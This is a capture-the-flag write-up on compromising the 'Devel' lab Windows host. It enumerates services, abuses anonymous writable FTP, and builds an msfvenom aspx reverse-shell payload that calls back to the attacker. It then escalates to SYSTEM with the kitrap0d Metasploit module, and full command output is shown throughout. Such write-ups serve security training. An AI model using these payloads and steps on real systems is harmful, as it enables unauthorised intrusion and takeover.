# Devel Write-ups

\# BlueBrain

## Enumeration

### Nmap

```
# nmap -sC -sV -oA nmap 10.10.10.5
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-03 03:54 EDT
Nmap scan report for 10.10.10.5
Host is up (0.21s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: IIS7
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.00 seconds
```

Nmap reveals a Microsoft FTP server as well as a Microsoft IIS server. Running Dirbuster, with the lowercase medium wordlist, against the IIS server returns no results. The most likely initial attack vector appears to be FTP in this case.

## Exploitation

Without any detailed version information on the Microsoft FTP server, it will need to be approached differently. In this case, the most likely entry method appears to be a misconfiguration or weak login credentials.

Attempting to connect anonymously via FTP reveals that the server does allow anonymous login with read/write privileges in the IIS server directory.

```
# ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||49225|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp>
```

Armed with the ability to upload files, it is possible to drop an `aspx` reverse shell on the target and execute it by browsing to the file via the web server. The following command will create the aspx file: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LAB IP> LPORT=<PORT> -f aspx -o devel.aspx`

After starting a listener in Metasploit, the file can be uploaded with the `put` command via FTP. For example, put `./devel.aspx`. Loading this file by browsing to http://10.10.10.5/devel.aspx will trigger the reverse shell.

```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.3:4444 
[*] Sending stage (176198 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.16.3:4444 -> 10.10.10.5:49227) at 2024-06-03 04:13:07 -0400

meterpreter > getuid
Server username: IIS APPPOOL\Web
meterpreter >
```

By default, the working directory is set to `c:\windows\system32\inetsrv`, which the IIS user does not have write permissions for. Navigating to `c:\windows\TEMP` is a good idea, as a large portion of Metasploit’s Windows privilege escalation modules require a file to be written to the target during exploitation.

## Privilege Escalation

Running `sysinfo` in the Meterpreter session reveals that the target is x86 architecture, so it is possible to get fairly reliable suggestions with the local_exploit_suggester module. The same can not be said for running the module on x64. Running the suggester gives the following recommended escalation modules:

- exploit/windows/local/bypassuac_eventvwr
- exploit/windows/local/ms10_015_kitrap0d
- … and 9 more ...

Going down the list, `bypassauc_eventvwr` fails due to the IIS user not being a part of the administrators group, which is the default and to be expected. The second option, `ms10_015_kitrap0d`, does the trick. The flags can now be obtained from `c:\Users\babis\Desktop\user.txt` and `c:\Users\Administrator\Desktop\root.txt`

```
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use exploit/windows/local/ms10_015_kitrap0d 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms10_015_kitrap0d) > set LHOST 10.10.16.3
LHOST => 10.10.16.3
msf6 exploit(windows/local/ms10_015_kitrap0d) > set LPORT 4449
LPORT => 4449
msf6 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.16.3:4449 
[*] Reflectively injecting payload and triggering the bug...
[*] Launching msiexec to host the DLL...
[+] Process 2304 launched.
[*] Reflectively injecting the DLL into 2304...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (176198 bytes) to 10.10.10.5
[*] Meterpreter session 2 opened (10.10.16.3:4449 -> 10.10.10.5:49228) at 2024-06-03 04:25:22 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```